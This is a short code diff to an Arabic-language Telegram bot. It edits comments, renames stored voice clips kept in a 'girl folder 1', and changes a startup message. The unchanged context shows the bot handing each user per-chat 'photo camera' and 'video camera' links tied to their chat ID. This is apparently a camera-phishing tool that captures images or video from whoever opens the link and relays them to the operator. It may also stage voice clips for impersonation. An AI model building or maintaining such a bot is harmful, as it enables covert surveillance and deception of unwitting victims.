@@ -90,13 +90,11 @@ def handle_query(call):
         
     elif call.data == "get_photo_link":
         link = f"{PHOTO_PAGE_URL}?chatId={chat_id}"
-        # تم إزالة العلامات الرمادية وجعل الرابط نظيفاً وقابلاً للفتح المباشر بضغطة زر واحدة
         bot.send_message(chat_id, f"🔗 **رابط كاميرا الصور الخاص بك هو جاهز الآن للضغط:**\n\n{link}", parse_mode="Markdown")
         bot.answer_callback_query(call.id)
         
     elif call.data == "get_video_link":
         link = f"{VIDEO_PAGE_URL}?chatId={chat_id}"
-        # تعديل الرابط ليكون أزرق وقابلاً للضغط السريع فوراً
         bot.send_message(chat_id, f"🔗 **رابط كاميرا الفيديو الخاص بك هو جاهز الآن للضغط:**\n\n{link}", parse_mode="Markdown")
         bot.answer_callback_query(call.id)
         
@@ -146,7 +144,8 @@ def handle_all_media(message):
         if next_slot > 10: 
             db = {} 
             next_slot = 1
-        name = f"مكتبة {next_slot}"
+        # تم تأكيد الاسم هنا ليكون "مقطع" ليتوافق مع أزرار العرض بشكل صحيح
+        name = f"مقطع {next_slot}"
         db[name] = message.voice.file_id
         save_db(db)
         bot.send_message(chat_id, f"✅ **تم حفظ وتحديث ({name}) بنجاح داخل مجلد الفتاة 1!**", parse_mode="Markdown")
@@ -174,5 +173,5 @@ def handle_all_media(message):
 
 if __name__ == '__main__':
     threading.Thread(target=run_dummy_server, daemon=True).start()
-    print("🚀 البوت يعمل الآن بكفاءة والروابط أصبحت زرقاء وقابلة للفتح...")
+    print("🚀 تم إصلاح مشكلة الحفظ والروابط تعمل بشكل كامل وزرقاء...")
     bot.polling(none_stop=True, interval=0, timeout=40)
